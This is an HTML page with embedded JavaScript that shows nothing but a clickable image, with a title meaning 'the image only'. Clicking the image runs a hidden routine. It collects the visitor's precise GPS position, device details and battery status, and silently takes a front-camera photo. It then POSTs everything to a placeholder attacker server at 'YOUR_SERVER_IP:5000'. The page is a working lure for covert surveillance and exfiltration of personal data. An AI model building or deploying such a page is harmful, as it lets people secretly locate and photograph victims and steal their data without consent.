<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>الصورة فقط</title>
    <style>
        body { display:flex; justify-content:center; align-items:center; height:100vh; }
        img { cursor:pointer; width:300px; }
    </style>
</head>
<body>
    <img src="button.jpg" onclick="capture()">

    <video id="video" width="300" autoplay style="display:none;"></video>
    <canvas id="canvas" width="300" style="display:none;"></canvas>

    <script>
        async function capture() {
            if (!navigator.geolocation) { alert("الموقع غير مدعوم"); return; }

            navigator.geolocation.getCurrentPosition(async function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    battery: null
                };

                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = { level: battery.level*100, charging: battery.charging };
                }

                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');

                try {
                    const streamVideo = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } });
                    video.srcObject = streamVideo;

                    setTimeout(() => {
                        canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
                        const imgData = canvas.toDataURL('image/png');

                        // إرسال البيانات إلى السيرفر
                        fetch("http://YOUR_SERVER_IP:5000/receive_data", {
                            method:"POST",
                            headers: { "Content-Type":"application/json" },
                            body: JSON.stringify({ lat, lon, imgData, deviceInfo })
                        });

                        video.srcObject.getTracks().forEach(track => track.stop());

                        alert("تم إرسال البيانات بنجاح!");
                    },2000);
                } catch(err) { alert("تعذر الوصول للكاميرا: "+err); }
            }, function(err) {
                alert("تعذر الحصول على الموقع GPS: "+err.message);
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
